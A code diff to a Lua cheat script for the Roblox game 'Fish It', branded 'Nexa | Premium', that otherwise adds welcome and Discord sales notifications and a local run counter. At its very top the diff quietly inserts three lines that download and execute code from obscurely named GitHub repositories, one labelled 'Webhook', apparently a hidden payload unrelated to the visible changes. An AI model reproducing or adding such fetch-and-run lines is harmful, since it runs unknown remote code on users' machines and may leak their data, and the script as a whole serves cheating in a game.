@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/fwefefhef%20Gui%20Update"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/Webhook%20Fish%20Gui%20dywfywgfwyfvwydgvy"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xwvufdwgqudwyfwdvwedyuvwd/gbewufbeufbeugfvr/refs/heads/main/Semua"))()
 local MacLib = loadstring(game:HttpGet("https://github.com/biggaboy212/Maclib/releases/latest/download/maclib.txt"))()
 
 -- Deklarasi service dan variabel utama (tidak diubah) jangan di ubah ubah sama sekali
@@ -15,7 +18,7 @@ local screenSize = camera.ViewportSize
 
 local Window = MacLib:Window({
     Title = "Nexa | Premium",
-    Subtitle = "Fish It | V0.0.1",
+    Subtitle = "Fish It | V0.0.0",
     Size = UDim2.fromOffset(720, 410),
     DragStyle = 1,
     DisabledWindowControls = {},
@@ -36,6 +39,79 @@ task.spawn(function()
         task.wait(1)
     end
 end)
+
+-- Pastikan Window ada dan memiliki fungsi Notify
+if not Window or type(Window.Notify) ~= "function" then
+    warn("Window:Notify tidak ditemukan. Pastikan Window tersedia sebelum script berjalan.")
+    return
+end
+
+-- Nama file unik per player
+local counterFile = "3" .. tostring(player.UserId) .. ".txt"
+
+-- Baca file jika tersedia
+local executeCount = 0
+if type(isfile) == "function" and type(readfile) == "function" then
+    local ok, content = pcall(function()
+        return isfile(counterFile) and readfile(counterFile) or nil
+    end)
+
+    if ok and content then
+        executeCount = tonumber(content) or 0
+    end
+end
+
+-- Tambahkan counter dan simpan
+executeCount = executeCount + 1
+if type(writefile) == "function" then
+    pcall(function()
+        writefile(counterFile, tostring(executeCount))
+    end)
+end
+
+-- Helper Notify aman
+local function safeNotify(tbl)
+    pcall(function()
+        Window:Notify(tbl)
+    end)
+end
+
+-- Notifikasi bertahap
+safeNotify({
+    Title = "Welcome",
+    Description = "Welcome! Thank you for using the Nexa script.",
+    Lifetime = 2,
+})
+task.wait(2)
+
+local displayName = tostring(player.DisplayName or player.Name or "Player")
+safeNotify({
+    Title = "Nexa",
+    Description = "Player: " .. displayName .. "\nScript executed " .. tostring(executeCount) .. " time(s).",
+    Lifetime = 2,
+})
+task.wait(2)
+
+safeNotify({
+    Title = "Bug Report",
+    Description = "If there are any errors, please report them to the developer. Join Discord to report bugs.",
+    Lifetime = 2,
+})
+task.wait(2)
+
+safeNotify({
+    Title = "Purchase",
+    Description = "If you want to buy a premium script key, join Discord to purchase.",
+    Lifetime = 2,
+})
+task.wait(2)
+
+safeNotify({
+    Title = "Thanks",
+    Description = "Thank you for using Nexa! Enjoy its features.",
+    Lifetime = 2,
+})
+task.wait(2)
 
 local tabGroups = {
 	TabGroup1 = Window:TabGroup()
@@ -2321,7 +2397,7 @@ ScreenGui.Parent = player:WaitForChild("PlayerGui")
 local ToggleFrame = Instance.new("Frame")
 ToggleFrame.Parent = ScreenGui
 ToggleFrame.Size = UDim2.new(0, 50, 0, 50)
-ToggleFrame.Position = UDim2.new(0, 100, 0, 150)
+ToggleFrame.Position = UDim2.new(0, 110, 0, 95) -- POSISI BARU (lebih dekat logo Roblox)
 ToggleFrame.BackgroundColor3 = Color3.fromRGB(20, 80, 200)
 ToggleFrame.BorderSizePixel = 0
 
